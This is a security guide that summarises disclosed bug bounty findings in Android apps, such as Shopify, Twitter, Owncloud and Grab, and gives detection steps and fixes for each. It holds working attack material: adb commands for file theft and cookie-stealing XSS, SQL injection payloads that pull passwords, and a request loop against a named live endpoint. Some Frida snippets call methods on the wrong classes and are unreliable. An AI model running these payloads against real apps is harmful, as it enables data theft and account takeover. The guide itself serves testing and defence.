---
title: Real-World Android Vulnerabilities from Bug Bounty Programs
description: Documented Android vulnerabilities from HackerOne, Bugcrowd with high bounty payouts, including deep link attacks, broadcast exploits, and content provider SQLi
tags:
  - android
  - deep-link
  - broadcast
  - content-provider
  - webview
  - oauth
  - real-world
---

# Real-World Android Vulnerabilities from Bug Bounty Programs

This guide documents Android-specific vulnerabilities found in real bug bounty programs (HackerOne, Bugcrowd) with high bounty payouts. These patterns complement standard OWASP/MSTG findings with production-tested attack vectors.

## Sources
- Analysis of 116 Android-related reports from disclosed_reports.db
- Focus on vulnerabilities with confirmed bounty awards ($50-$5,040)
- Categories: Deep Link Attacks, BroadcastReceiver Exploits, ContentProvider SQLi, WebView Bypass, Authentication Bypass

---

## 1. Deep Link Path Traversal (CVSS 7.5-8.5)

### Description
Android apps declare deep link handlers in manifest but fail to properly validate path traversal sequences. Attackers use `../` sequences to bypass path restrictions.

### Real-World Example
**Shopify Android** - Path traversal in deep link validation:
```
# Normal (blocked)
https://TARGET.myshopify.com/admin/collections

# Bypassed (allowed)
https://TARGET.myshopify.com/admin/collections/../../..

# Leads to:
- Arbitrary URL loading in WebView
- EASDK bridge access (JavaScript execution)
- File access via EASDK.redirect("file:///data/data/...")
```

### Detection
1. Decompile APK and search manifest for deep link declarations:
```bash
grep -A5 "intent-filter" AndroidManifest.xml | grep -B2 "scheme=\"https\""
```

2. Test path traversal in each deep link:
```bash
adb shell am start -n com.target.app/.MainActivity \
  -d "https://target.com/admin/collections/../../../external"
```

3. Look for path validation bypass patterns in decompiled code:
```bash
# Pattern in Smali
invoke-virtual {p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

# Check if validation is just "contains" instead of exact match
```

### Frida Script
```javascript
// Hook WebView.loadUrl to detect arbitrary URL loading
Java.perform(function() {
    var WebView = Java.use('android.webkit.WebView');
    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
        console.log('[DeepLink] WebView loading: ' + url);
        if (url.startsWith('file://') || url.startsWith('javascript://')) {
            console.log('[ALERT] Potentially malicious URL scheme detected!');
        }
        this.loadUrl(url);
    };
});
```

### Remediation
```java
// BAD - Only checks if path starts with /admin/
if (uri.getPath().startsWith("/admin/")) {
    loadInWebView(uri.toString());
}

// GOOD - Canonicalize and validate
String path = uri.getPath();
if (path == null || path.contains("..") || !path.startsWith("/admin/")) {
    throw new SecurityException("Invalid path");
}
```

---

## 2. BroadcastReceiver Information Leakage (CVSS 5.3-7.5)

### Description
Apps send sensitive data via broadcasts without proper permission checks. Any app can register to receive these broadcasts.

### Real-World Example
**Twitter Android** - Location data broadcast without permission:
```java
// Vulnerable code found in Twitter app
paramLocation = new Intent("com.twitter.library.geo.LOCATION_CHANGED")
    .putExtra("com.twitter.library.geo.LOCATION_EXTRA", paramLocation);
this.c.sendBroadcast(paramLocation);

// Any app can receive this - no permission check
```

### Detection
1. Decompile and search for sendBroadcast calls:
```bash
grep -rn "sendBroadcast" --include="*.smali" | grep -v "permission"
```

2. Check for custom action strings in broadcasts:
```bash
grep -rn "Ljava/lang/String;" --include="*.smali" | grep "broadcast"
```

3. Test with Frida - enumerate all BroadcastReceivers:
```javascript
Java.perform(function() {
    var pm = Java.use('android.content.pm.PackageManager');
    var apps = pm.getInstalledApplications(0);
    apps.forEach(function(app) {
        console.log('App: ' + app.packageName);
    });
});
```

### Frida Script - Detect Unprotected Broadcasts
```javascript
// Hook sendBroadcast to log all broadcasts
Java.perform(function() {
    var Intent = Java.use('android.content.Intent');

    Intent.prototype.sendBroadcast.overload().implementation = function() {
        console.log('[BROADCAST] Action: ' + this.getAction());
        console.log('[BROADCAST] Data: ' + this.getDataString());
        console.log('[BROADCAST] Extras: ' + JSON.stringify(this.getExtras()));
        this.sendBroadcast();
    };
});
```

### Remediation
```java
// BAD - No permission
sendBroadcast(new Intent("com.twitter.library.geo.LOCATION_CHANGED"));

// GOOD - Use permission
Intent intent = new Intent("com.twitter.library.geo.LOCATION_CHANGED");
sendBroadcast(intent, "com.twitter.library.permission.ACCESS_LOCATION");
```

---

## 3. ContentProvider SQL Injection (CVSS 6.5-8.0)

### Description
Exported ContentProviders don't properly sanitize user input in SQL queries, allowing SQL injection attacks from any app on the device.

### Real-World Example
**Owncloud Android** - Multiple SQL injection points in FileContentProvider:
```kotlin
// Vulnerable pattern in FileContentProvider.kt
override fun delete(uri: Uri, where: String?, whereArgs: Array<String>?): Int {
    when (uriMatcher.match(uri)) {
        SINGLE_FILE -> {
            count = db.delete(
                ProviderTableMeta.FILE_TABLE_NAME,
                ProviderTableMeta._ID + "=" + uri.pathSegments[1] +
                if (!TextUtils.isEmpty(where)) " AND ($where)"  // INJECTION
                else "", whereArgs
            )
        }
    }
}
```

### Detection
1. Check manifest for exported ContentProviders:
```bash
grep -B2 -A5 "provider" AndroidManifest.xml | grep -B1 -A5 "exported=\"true\""
```

2. Query ContentProvider to test for injection:
```bash
# Test projection map bypass
content query --uri content://org.owncloud/file \
  --projection "*,(SELECT GROUP_CONCAT(name) FROM SQLITE_MASTER)"

# Test selection injection
content query --uri content://org.owncloud/file \
  --where "_id=1 AND (SELECT 1)=1"
```

3. Decompile and search for raw SQL patterns:
```bash
grep -rn "db.delete\|db.insert\|db.update\|db.query" --include="*.smali"
```

### Frida Script - ContentProvider Exploitation
```javascript
// Exploit ContentProvider SQL injection
Java.perform(function() {
    var resolver = Java.use('android.content.ContentResolver');

    // Test for SQL injection in query
    var uri = Java.use('android.net.Uri').parse('content://org.owncloud/file');
    var cursor = resolver.query(uri, null, "'a'='a' AND 1=1--", null, null);
    console.log('[SQLi] Query result count: ' + cursor.getCount());
});
```

### Exploitation PoC (Java)
```java
// From actual Owncloud exploit - extract arbitrary data via SQLi
Uri result = ctx.getContentResolver().insert(
    Uri.parse("content://org.owncloud/file"),
    createMaliciousContentValues()
);

ContentValues updateValues = new ContentValues();
updateValues.put(
    "etag=?,path=(SELECT GROUP_CONCAT(password) FROM users)--",
    "a"
);

ctx.getContentResolver().update(result, updateValues, null, null);
// Now query the result to exfiltrate passwords
```

---

## 4. Biometric Authentication Bypass via Deep Link (CVSS 6.5-7.5)

### Description
Apps with biometric authentication can be bypassed by triggering deep links when the app is already open in memory.

### Real-World Example
**Shopify Android** - Biometric bypass via deep link:
```
1. User opens Shopify app and authenticates with fingerprint
2. App is in background (still in memory)
3. Attacker triggers:
   adb shell am start -n com.shopify.mobile/...DeepLinkActivity \
     -d 'https://www.shopify.com/admin/products'
4. App handles deep link WITHOUT re-authenticating
5. Attacker has access to authenticated session
```

### Detection
1. Decompile and check if biometric is checked on resume:
```bash
grep -rn "onResume\|onCreate\|biometric" --include="*.smali" | grep -i "auth"
```

2. Test deep link while app is in background:
```bash
# Open app, authenticate, press home
adb shell am start -n com.target.app/.MainActivity -d "target://admin"
```

### Frida Script - Detect Missing Biometric Checks
```javascript
Java.perform(function() {
    var Activity = Java.use('android.app.Activity');

    Activity.prototype.onResume.implementation = function() {
        console.log('[Activity] onResume: ' + this.getClass().getName());
        // Check if biometric is enforced
        this.onResume();
    };
});
```

---

## 5. WebView URI Scheme Exploitation (CVSS 6.5-9.0)

### Description
Exported Activities handling deep links don't validate URI schemes, allowing file:// and javascript:// attacks.

### Real-World Example
**Twitter Lite Android** - File theft and XSS via exported activity:
```bash
# Steal local files
adb shell am start -n com.twitter.android.lite/.TwitterLiteActivity \
  -d "file:///sdcard/BugBounty/1.html"

# XSS via javascript://
adb shell am start -n com.twitter.android.lite/.TwitterLiteActivity \
  -d "javascript://example.com%0Aalert(document.cookie);"

# Open redirect
adb shell am start -n com.twitter.android.lite/.TwitterLiteActivity \
  -d "http://evilzone.org"
```

### Detection
1. Find exported activities handling VIEW intents:
```bash
grep -B3 -A10 "intent-filter" AndroidManifest.xml | grep -B2 -A8 "action.VIEW"
```

2. Test URI schemes with adb (see examples above)

3. Check WebView settings:
```bash
grep -rn "setJavaScriptEnabled\|WebView\|addJavascriptInterface" --include="*.smali"
```

### Frida Script - WebView Attack Detection
```javascript
Java.perform(function() {
    var WebView = Java.use('android.webkit.WebView');

    // Hook loadUrl to catch all URL patterns
    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
        if (url.startsWith('file://')) {
            console.log('[ALERT] File URL loaded in WebView: ' + url);
        }
        if (url.startsWith('javascript://')) {
            console.log('[ALERT] JavaScript scheme detected: ' + url);
        }
        this.loadUrl(url);
    };
});
```

---

## 6. OAuth Deep Link Hijacking (CVSS 8.0-9.0)

### Description
Apps using OAuth without PKCE are vulnerable to authorization code interception via malicious app registering same URL scheme.

### Real-World Example
**Shop App** - Microsoft OAuth code interception:
```
1. Shop app declares URL scheme: shopapp://
2. Malicious app also registers shopapp:// (Android allows this)
3. User authenticates via OAuth in Shop app
4. System shows "Complete action with" dialog
5. If malicious app appears first in list, it receives the auth code
6. Code is exchanged for token - account takeover
```

### Detection
1. Check for URL schemes in manifest:
```bash
grep -rn "scheme=" AndroidManifest.xml | grep -v "http\|https"
```

2. Check if PKCE is implemented:
```bash
grep -rn "code_verifier\|code_challenge\|PKCE" --include="*.smali"
```

### Remediation
```java
// OAuth flow MUST use PKCE
AuthorizationRequest.Builder builder = new AuthorizationRequest.Builder(
    serverConfiguration,
    clientId,
    ResponseTypeValues.CODE,
    redirectUri
);
builder.setPKCE(codeVerifier);  // Required
```

---

## 7. OTP Brute Force via Rate Limiting Absence (CVSS 7.5)

### Real-World Example
**Grab Android** - OTP bypass via no rate limiting:
```
Endpoint: https://p.grabtaxi.com/api/passenger/v2/profiles/activationsms
Issue: No rate limiting on code resend

Attack:
- 3 attempts per code
- Code expires after failed attempts
- But resend has no rate limit
- 30 second resend interval = 360 attempts/hour
- 4-digit code (10,000 possibilities)
- Success in 24-72 hours
```

### Detection
```bash
# Test resend endpoint
for i in {1..20}; do
  curl -X POST https://p.grabtaxi.com/api/passenger/v2/profiles/activationsms \
    -H "Content-Type: application/json" \
    -d '{"phone":"+1234567890"}'
  sleep 1
done
```

---

## CVSS Scoring Quick Reference

| Vulnerability | CVSS | Bounty Range |
|---------------|------|--------------|
| OAuth hijacking + account takeover | 9.0 | $1,000-$5,000 |
| Deep link → WebView UXSS | 8.5 | $750-$3,000 |
| ContentProvider SQL injection | 8.0 | $300-$2,000 |
| Biometric bypass | 7.5 | $500-$1,500 |
| Broadcast info leak | 7.0 | $500-$1,000 |
| OTP brute force | 7.5 | $500-$1,000 |
| Deep link path traversal | 7.5 | $500-$2,000 |

---

## Priority Testing Checklist

From highest bounty impact:

1. [ ] **Deep Link Testing**
   - [ ] Path traversal: `/../` sequences
   - [ ] javascript:// and file:// URI handling
   - [ ] Host validation bypasses

2. [ ] **Broadcast Analysis**
   - [ ] Custom action strings without permission
   - [ ] Sensitive data in broadcasts (location, tokens)
   - [ ] Ordered broadcasts allow injection

3. [ ] **ContentProvider Testing**
   - [ ] SQL injection in query/insert/update/delete
   - [ ] Path traversal in file access
   - [ ] Permission-based access control

4. [ ] **WebView Security**
   - [ ] javascript:// scheme handling
   - [ ] file:// access to app data
   - [ ] addJavascriptInterface exposure

5. [ ] **Authentication Flow**
   - [ ] Biometric bypass via deep link
   - [ ] OTP rate limiting
   - [ ] Session handling after password change

6. [ ] **OAuth/Mobile Auth**
   - [ ] PKCE implementation
   - [ ] URL scheme conflicts
   - [ ] Token storage security

---

## References

- [OWASP Mobile Top 10 - M1: Improper Platform Usage](https://owasp.org/www-project-mobile-top-10/)
- [Android Security - Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)
- [Android Security - Content Providers](https://developer.android.com/guide/topics/providers/content-provider-basics)
- [Android Security - Network Security](https://developer.android.com/guide/topics/security/security)
- [PortSwigger - WebView Security](https://portswigger.net/web-security/webview)
